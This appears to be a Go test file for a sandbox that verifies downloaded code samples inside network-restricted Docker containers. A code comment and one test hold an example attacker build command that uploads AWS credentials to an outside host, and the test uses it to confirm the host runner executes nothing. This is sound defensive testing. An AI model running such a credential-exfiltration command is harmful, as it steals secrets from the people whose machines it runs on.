package sandbox

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/r2cuerdame/codesamplex/internal/domain"
)

func stubExec(t *testing.T, fn func(ctx context.Context, dir string, argv []string) ([]byte, error)) {
	t.Helper()
	old := execCombined
	execCombined = fn
	t.Cleanup(func() { execCombined = old })
}

func npmManifest() domain.SampleManifest {
	return domain.SampleManifest{
		SchemaVersion: 1,
		Environment: domain.EnvironmentFingerprint{
			SchemaVersion: 1, Ecosystem: "npm", OS: "windows", Arch: "amd64",
		},
		BuildCommand:    []string{"npm", "run", "build"},
		ContractCommand: []string{"node", "test/contract.mjs"},
	}
}

func TestDetectCapability(t *testing.T) {
	oldLook, oldProbe := lookDocker, dockerProbe
	t.Cleanup(func() { lookDocker, dockerProbe = oldLook, oldProbe })

	lookDocker = func() error { return nil }
	dockerProbe = func(ctx context.Context) error { return nil }
	if got := Detect(context.Background()); got != domain.CapContainerRun {
		t.Fatalf("docker ok → %s, want CONTAINER_RUN", got)
	}

	dockerProbe = func(ctx context.Context) error { return errors.New("daemon down") }
	if got := Detect(context.Background()); got != domain.CapCompileOnly {
		t.Fatalf("daemon down → %s, want COMPILE_ONLY", got)
	}

	lookDocker = func() error { return errors.New("not found") }
	if got := Detect(context.Background()); got != domain.CapCompileOnly {
		t.Fatalf("no cli → %s, want COMPILE_ONLY", got)
	}
}

func TestResolveCommandPerEcosystem(t *testing.T) {
	cases := map[string][]string{
		"npm":    {"sh", "-c", "rm -rf /work/node_modules; npm ci --ignore-scripts"},
		"pypi":   {"sh", "-c", "set -e; rm -rf /work/.csx-vendor/py /work/.csx-vendor/pip-report.json; mkdir -p /work/.csx-vendor; pip install --no-deps --no-compile --report /work/.csx-vendor/pip-report.json --target /work/.csx-vendor/py -r requirements.txt"},
		"golang": {"sh", "-c", "set -e; rm -rf /work/.csx-vendor/gomod /work/.csx-vendor/gobuild /work/.csx-vendor/go-modules.json; mkdir -p /work/.csx-vendor; go mod download; go list -m -json all > /work/.csx-vendor/go-modules.json"},
		"cargo":  {"sh", "-c", "rm -rf /work/.csx-vendor/cargo /work/.csx-vendor/target; cargo fetch --locked"},
	}
	for eco, want := range cases {
		got, err := resolveCommand(eco, "")
		if err != nil {
			t.Fatalf("%s: %v", eco, err)
		}
		if strings.Join(got, " ") != strings.Join(want, " ") {
			t.Fatalf("%s: %v, want %v", eco, got, want)
		}
	}
	for runtime, want := range map[string][]string{
		"bun":  {"sh", "-c", "rm -rf /work/node_modules; bun install --frozen-lockfile --ignore-scripts"},
		"deno": {"sh", "-c", "rm -rf /work/node_modules /work/.csx-vendor/deno; deno install --frozen"},
	} {
		got, err := resolveCommand("npm", runtime)
		if err != nil || strings.Join(got, " ") != strings.Join(want, " ") {
			t.Fatalf("npm/%s: %v, %v; want %v", runtime, got, err, want)
		}
	}
	if _, err := resolveCommand("nuget", ""); err == nil {
		t.Fatal("unknown ecosystem must error")
	}
}

func TestEveryResolverStartsFromCleanGeneratedOutput(t *testing.T) {
	for _, eco := range []string{"npm", "pypi", "golang", "cargo", "composer", "gem", "pub", "hex"} {
		got, err := resolveCommand(eco, "")
		if err != nil {
			t.Fatalf("%s: %v", eco, err)
		}
		if !strings.Contains(strings.Join(got, " "), "rm -rf") {
			t.Errorf("%s resolver can reuse author-planted generated output: %v", eco, got)
		}
	}
	for _, runtime := range []string{"bun", "deno"} {
		got, err := resolveCommand("npm", runtime)
		if err != nil {
			t.Fatalf("npm/%s: %v", runtime, err)
		}
		if !strings.Contains(strings.Join(got, " "), "rm -rf") {
			t.Errorf("npm/%s resolver can reuse author-planted output: %v", runtime, got)
		}
	}
}

func TestDockerRunnerArgs(t *testing.T) {
	var calls [][]string
	stubExec(t, func(ctx context.Context, dir string, argv []string) ([]byte, error) {
		calls = append(calls, argv)
		return []byte("ok"), nil
	})

	r := DockerRunner{}
	m := npmManifest()
	dir := t.TempDir()

	if res := r.Resolve(context.Background(), dir, m); res.Result != ResultPass {
		t.Fatalf("resolve: %+v", res)
	}
	if res := r.Build(context.Background(), dir, m); res.Result != ResultPass {
		t.Fatalf("build: %+v", res)
	}
	if res := r.Contract(context.Background(), dir, m); res.Result != ResultPass {
		t.Fatalf("contract: %+v", res)
	}
	if len(calls) != 3 {
		t.Fatalf("expected 3 docker invocations, got %d", len(calls))
	}

	resolve := strings.Join(calls[0], " ")
	build := strings.Join(calls[1], " ")
	contract := strings.Join(calls[2], " ")

	for i, s := range []string{resolve, build, contract} {
		if !strings.HasPrefix(s, "docker run --rm") {
			t.Errorf("call %d not docker run --rm: %s", i, s)
		}
		for _, want := range []string{"--memory=512m", "--pids-limit=256", ":/work", "-w /work", "node:22-alpine"} {
			if !strings.Contains(s, want) {
				t.Errorf("call %d missing %q: %s", i, want, s)
			}
		}
		if strings.Contains(s, "-e ") || strings.Contains(s, "--env") {
			t.Errorf("call %d passes env through: %s", i, s)
		}
	}
	// Resolve has network ON; build + contract are network-off.
	if strings.Contains(resolve, "--network=none") {
		t.Errorf("resolve must keep network on: %s", resolve)
	}
	if !strings.Contains(build, "--network=none") {
		t.Errorf("build must be network-off: %s", build)
	}
	if !strings.Contains(contract, "--network=none") {
		t.Errorf("contract must be network-off: %s", contract)
	}
	if !strings.Contains(resolve, "npm ci --ignore-scripts") {
		t.Errorf("resolve command wrong: %s", resolve)
	}
	if !strings.HasSuffix(contract, "node test/contract.mjs") {
		t.Errorf("contract command wrong: %s", contract)
	}
}

func TestDockerRunnerImages(t *testing.T) {
	cases := map[string]string{
		"npm":    "node:22-alpine",
		"pypi":   "python:3.12-alpine",
		"golang": "golang:1.26-alpine",
		"cargo":  "rust:1-alpine",
	}
	for eco, want := range cases {
		img, err := imageFor(eco, "")
		if err != nil {
			t.Fatalf("%s: %v", eco, err)
		}
		if img != want {
			t.Fatalf("%s: %s, want %s", eco, img, want)
		}
	}
	if _, err := imageFor("nuget", ""); err == nil {
		t.Fatal("unknown ecosystem must error")
	}
}

func TestDockerRunnerFailure(t *testing.T) {
	stubExec(t, func(ctx context.Context, dir string, argv []string) ([]byte, error) {
		return []byte("npm ERR! missing lockfile"), errors.New("exit status 1")
	})
	res := DockerRunner{}.Resolve(context.Background(), t.TempDir(), npmManifest())
	if res.Result != ResultFail {
		t.Fatalf("result %s, want FAIL", res.Result)
	}
	if !strings.Contains(res.Log, "missing lockfile") {
		t.Fatalf("log lost: %q", res.Log)
	}
}

// NativeRunner used to run two stages on the host, and both were remote
// code execution. Build ran m.BuildCommand — an argv taken verbatim from a
// downloaded, unsigned manifest — so publishing a sample carrying
// {"buildCommand":["sh","-c","curl -T $HOME/.aws/credentials …"]} was
// enough: the next Docker-less peer with idle verification claimed the job
// and ran it. Resolve looked safer and was not, because `pip install -r
// requirements.txt` executes setup.py from any sdist the SAMPLE names.
//
// The package header has always said downloaded samples never run directly
// on the host. Only Contract honoured it.
func TestNativeRunnerExecutesNothing(t *testing.T) {
	var calls [][]string
	stubExec(t, func(ctx context.Context, dir string, argv []string) ([]byte, error) {
		calls = append(calls, argv)
		return []byte("ok"), nil
	})

	r := NativeRunner{}
	dir := t.TempDir()
	m := npmManifest()
	// The shape an attacker would publish.
	m.BuildCommand = []string{"sh", "-c", "curl -T $HOME/.aws/credentials https://attacker"}

	for name, res := range map[string]StageResult{
		"resolve":  r.Resolve(context.Background(), dir, m),
		"build":    r.Build(context.Background(), dir, m),
		"contract": r.Contract(context.Background(), dir, m),
	} {
		if res.Result != ResultSkipped {
			t.Errorf("%s = %s, want SKIPPED on a host with no sandbox", name, res.Result)
		}
	}
	if len(calls) != 0 {
		t.Fatalf("a host without isolation executed %d command(s) from a downloaded sample: %v",
			len(calls), calls)
	}
}

// TestStageEnvKeepsCachesInTheWorkspace pins why non-npm verification used
// to be impossible: resolve and contract are separate containers sharing
// only /work, so a toolchain cache anywhere else is gone before the
// contract runs. Every value here must therefore live under /work, and
// none may forward host environment.
func TestStageEnvKeepsCachesInTheWorkspace(t *testing.T) {
	for _, eco := range []string{"pypi", "golang", "cargo"} {
		env := stageEnv(eco, "")
		if len(env) == 0 {
			t.Errorf("%s: no stage env, its resolve output cannot survive to the contract stage", eco)
			continue
		}
		for _, kv := range env {
			key, value, ok := strings.Cut(kv, "=")
			if !ok {
				t.Errorf("%s: %q is not KEY=VALUE", eco, kv)
				continue
			}
			// Non-path settings (flags, toggles) carry no directory.
			if !strings.Contains(value, "/") {
				continue
			}
			if !strings.HasPrefix(value, "/work/") {
				t.Errorf("%s: %s points at %s, outside the mounted workspace", eco, key, value)
			}
		}
	}
	if env := stageEnv("npm", ""); len(env) != 0 {
		t.Errorf("npm needs no stage env (node_modules is already in the workspace), got %v", env)
	}
}

// TestRuntimePicksTheImage pins the execution-context axis. An ecosystem is
// not a runtime: npm packages run on Node, Bun and Deno, and "does this
// work on Bun" is the compatibility question the project exists for.
// Keying the image on ecosystem alone meant every npm sample was verified
// under Node, so every sample in the network reported executionContext
// "node" — not because that was true of the ecosystem, but because no
// other value could be produced.
func TestRuntimePicksTheImage(t *testing.T) {
	for _, tc := range []struct{ runtime, wantImage, wantRuntime, wantVersion string }{
		{"", "node:22-alpine", "node", "22"},
		{"node", "node:22-alpine", "node", "22"},
		{"bun", "oven/bun:1-alpine", "bun", "1"},
		{"deno", "denoland/deno:alpine", "deno", "2"},
	} {
		img, err := imageFor("npm", tc.runtime)
		if err != nil || img != tc.wantImage {
			t.Errorf("imageFor(npm, %q) = %q, %v; want %q", tc.runtime, img, err, tc.wantImage)
		}
		rt, ver, lang := imageRuntime("npm", tc.runtime)
		if rt != tc.wantRuntime || ver != tc.wantVersion || lang != "javascript" {
			t.Errorf("imageRuntime(npm, %q) = %q/%q/%q", tc.runtime, rt, ver, lang)
		}
	}
	if _, err := imageFor("npm", "quickjs"); err == nil {
		t.Error("an unknown runtime must error rather than silently using node")
	}

	// The receipt must describe the runtime the SAMPLE declares; reading the
	// host's would stamp a bun contract as node whenever the operator's own
	// machine happened to run node.
	m := domain.SampleManifest{Environment: domain.EnvironmentFingerprint{
		SchemaVersion: 1, Ecosystem: "npm", Runtime: "bun"}}
	host := domain.EnvironmentFingerprint{SchemaVersion: 1, Ecosystem: "npm", Runtime: "node"}
	env := DockerRunner{}.StageEnvironment(host, m)
	if env.Runtime != "bun" || env.ExecutionContext != "bun" {
		t.Errorf("StageEnvironment = %s/%s, want bun/bun", env.Runtime, env.ExecutionContext)
	}

	// Deno's module cache lives outside the project, so it must be pointed
	// into the workspace or it cannot survive to the offline stage.
	found := false
	for _, kv := range stageEnv("npm", "deno") {
		if strings.HasPrefix(kv, "DENO_DIR=/work/") {
			found = true
		}
	}
	if !found {
		t.Errorf("deno needs DENO_DIR inside the workspace, got %v", stageEnv("npm", "deno"))
	}
}

func TestBrowserContextPicksARealChromeImageAndReceiptContext(t *testing.T) {
	m := domain.SampleManifest{Environment: domain.EnvironmentFingerprint{
		SchemaVersion: 1,
		Ecosystem:     "npm", Runtime: "node", ExecutionContext: "browser",
		BrowserFamily: "chrome", BrowserMajor: "134",
		Engine: "chromium", EngineVersion: "134",
	}}
	img, err := imageForManifest(m)
	if err != nil {
		t.Fatal(err)
	}
	if img != chrome134Image {
		t.Fatalf("browser image = %q, want %q", img, chrome134Image)
	}

	host := domain.EnvironmentFingerprint{SchemaVersion: 1, OS: "windows", Arch: "x64"}
	env := (DockerRunner{}).StageEnvironment(host, m)
	if env.Runtime != "node" || env.RuntimeVersion != "22" {
		t.Errorf("browser harness runtime = %s %s, want node 22", env.Runtime, env.RuntimeVersion)
	}
	if env.ExecutionContext != "browser" || env.BrowserFamily != "chrome" || env.BrowserMajor != "134" {
		t.Errorf("browser receipt context = %+v", env)
	}
	if env.Engine != "chromium" || env.EngineVersion != "134" {
		t.Errorf("browser receipt engine = %s %s", env.Engine, env.EngineVersion)
	}
	if env.Libc != "glibc" || env.OSVersionBucket != "debian" {
		t.Errorf("browser receipt base = %s/%s, want glibc/debian", env.Libc, env.OSVersionBucket)
	}
}

func TestBrowserImageSupportIsFailClosed(t *testing.T) {
	supported := domain.WorkerRequirements{
		SandboxCapability: domain.CapContainerRun,
		Ecosystem:         "npm", Runtime: "node", ExecutionContext: "browser",
		BrowserFamily: "chrome", BrowserMajor: "134", Engine: "chromium", EngineVersion: "134",
	}
	if !ContainerSupportsRequirements(supported) {
		t.Fatal("the pinned Chrome 134 image should be preparable")
	}
	for name, mutate := range map[string]func(*domain.WorkerRequirements){
		"unknown browser major":  func(w *domain.WorkerRequirements) { w.BrowserMajor = "135" },
		"unsupported family":     func(w *domain.WorkerRequirements) { w.BrowserFamily = "firefox"; w.Engine = "gecko" },
		"browser without family": func(w *domain.WorkerRequirements) { w.BrowserFamily = "" },
		"unsupported webworker": func(w *domain.WorkerRequirements) {
			w.ExecutionContext = "webworker"
			w.BrowserFamily, w.BrowserMajor, w.Engine, w.EngineVersion = "", "", "", ""
		},
		"browser fields on node": func(w *domain.WorkerRequirements) { w.ExecutionContext = "node" },
	} {
		t.Run(name, func(t *testing.T) {
			want := supported
			mutate(&want)
			if ContainerSupportsRequirements(want) {
				t.Fatalf("unsupported browser requirements were accepted: %+v", want)
			}
		})
	}
}

func TestBrowserDockerArgsUseBundledCacheAndWritableWorkspace(t *testing.T) {
	args := dockerArgs(
		chrome134Image,
		"/tmp/browser-contract",
		true,
		[]string{"PUPPETEER_CACHE_DIR=/home/pptruser/.cache/puppeteer"},
		[]string{"node", "test/contract.mjs"},
		"csx-browser-test",
	)
	joined := " " + strings.Join(args, " ") + " "
	for _, want := range []string{
		" --network=none ",
		" --init ",
		" --user 0:0 ",
		" --env PUPPETEER_CACHE_DIR=/home/pptruser/.cache/puppeteer ",
		" " + chrome134Image + " ",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("browser docker args missing %q: %s", want, joined)
		}
	}
}

func TestNPMResolverMatchesReceiptPackageManager(t *testing.T) {
	host := domain.EnvironmentFingerprint{SchemaVersion: 1, Ecosystem: "npm", Runtime: "node"}
	for _, tc := range []struct {
		runtime, declaredPackageManager, want string
	}{
		{runtime: "", declaredPackageManager: "bun", want: "npm"},
		{runtime: "node", declaredPackageManager: "pnpm", want: "npm"},
		{runtime: "bun", declaredPackageManager: "npm", want: "bun"},
		{runtime: "deno", declaredPackageManager: "npm", want: "deno"},
	} {
		m := domain.SampleManifest{Environment: domain.EnvironmentFingerprint{
			SchemaVersion:  1,
			Ecosystem:      "npm",
			Runtime:        tc.runtime,
			PackageManager: tc.declaredPackageManager,
		}}
		cmd, err := resolveCommand("npm", tc.runtime)
		if err != nil {
			t.Fatalf("runtime %q: %v", tc.runtime, err)
		}
		if joined := " " + strings.Join(cmd, " ") + " "; !strings.Contains(joined, " "+tc.want+" ") {
			t.Errorf("runtime %q resolve command %q does not use %q", tc.runtime, joined, tc.want)
		}
		if got := (DockerRunner{}).StageEnvironment(host, m).PackageManager; got != tc.want {
			t.Errorf("runtime %q with declared package manager %q reports %q, want %q",
				tc.runtime, tc.declaredPackageManager, got, tc.want)
		}
	}

	// Other ecosystems still report exactly what their manifest declares.
	m := domain.SampleManifest{Environment: domain.EnvironmentFingerprint{
		SchemaVersion:  1,
		Ecosystem:      "cargo",
		Runtime:        "rust",
		PackageManager: "custom-cargo",
	}}
	if got := (DockerRunner{}).StageEnvironment(host, m).PackageManager; got != "custom-cargo" {
		t.Errorf("non-npm package manager changed to %q", got)
	}
}

// TestEveryEcosystemKeepsCachesInTheWorkspace covers the rule that decides
// whether an ecosystem can be supported at all: resolve and contract are
// separate containers sharing only /work, so any toolchain cache outside it
// is gone before the contract runs.
func TestEveryEcosystemKeepsCachesInTheWorkspace(t *testing.T) {
	for _, eco := range []string{"pypi", "golang", "cargo", "composer", "gem", "pub", "hex"} {
		env := stageEnv(eco, "")
		if len(env) == 0 {
			t.Errorf("%s: no cache redirection, its resolve output cannot survive the stage boundary", eco)
			continue
		}
		for _, kv := range env {
			key, value, ok := strings.Cut(kv, "=")
			if !ok {
				t.Errorf("%s: %q is not KEY=VALUE", eco, kv)
				continue
			}
			if !strings.Contains(value, "/") {
				continue // a flag or mode, not a path
			}
			if !strings.HasPrefix(value, "/work/") {
				t.Errorf("%s: %s points at %s, outside the mounted workspace", eco, key, value)
			}
		}
		if _, err := imageFor(eco, ""); err != nil {
			t.Errorf("%s: no image: %v", eco, err)
		}
		if _, err := resolveCommand(eco, ""); err != nil {
			t.Errorf("%s: no resolve command: %v", eco, err)
		}
		if rt, ver, lang := imageRuntime(eco, ""); rt == "" || ver == "" || lang == "" {
			t.Errorf("%s: incomplete runtime metadata %q/%q/%q — a receipt that cannot describe "+
				"where it ran does not count as environment diversity", eco, rt, ver, lang)
		}
	}
}

// TestResolveNeverRunsSampleCode pins the rule that rejected Gradle and
// Swift: the network-on stage must not execute anything the sample author
// wrote. Each ecosystem clears it differently, so the guard is that the
// command carries its ecosystem's specific opt-out.
func TestResolveNeverRunsSampleCode(t *testing.T) {
	for eco, mustContain := range map[string]string{
		"npm":      "--ignore-scripts",
		"composer": "--no-scripts",
		"hex":      "hex.package fetch", // never `mix deps.get`, which evaluates mix.exs
	} {
		cmd, err := resolveCommand(eco, "")
		if err != nil {
			t.Fatalf("%s: %v", eco, err)
		}
		if !strings.Contains(strings.Join(cmd, " "), mustContain) {
			t.Errorf("%s resolve %v is missing %q", eco, cmd, mustContain)
		}
	}
	// The hex resolve must never hand mix.lock to an Elixir evaluator, and
	// must never run a mix task from the project directory.
	hex, _ := resolveCommand("hex", "")
	script := strings.Join(hex, " ")
	for _, forbidden := range []string{"deps.get", "Code.eval", "elixir /work"} {
		if strings.Contains(script, forbidden) {
			t.Errorf("hex resolve contains %q, which would evaluate the sample's own code", forbidden)
		}
	}
}
